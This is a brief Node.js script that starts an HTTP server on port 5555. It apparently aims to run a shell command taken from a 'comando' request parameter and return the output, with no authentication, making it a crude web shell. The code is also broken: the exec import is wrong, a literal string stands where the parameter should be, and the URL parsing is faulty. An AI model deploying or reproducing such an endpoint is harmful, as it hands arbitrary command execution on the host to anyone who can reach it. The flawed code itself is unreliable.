const http = require('http')
const querystring = require('node:querystring');
const  exec  = require('node:child_process');


http.createServer(function (request, response) {
    let data = querystring.parse(request.url)
    console.log(data)
    exec(`data.comando`, (error, stdout, stderr) => {
        if (error) {
          console.error(`exec error: ${error}`);
          return;
        }
        response.write(stdout);
        response.end()
      });
    
}).listen(5555)
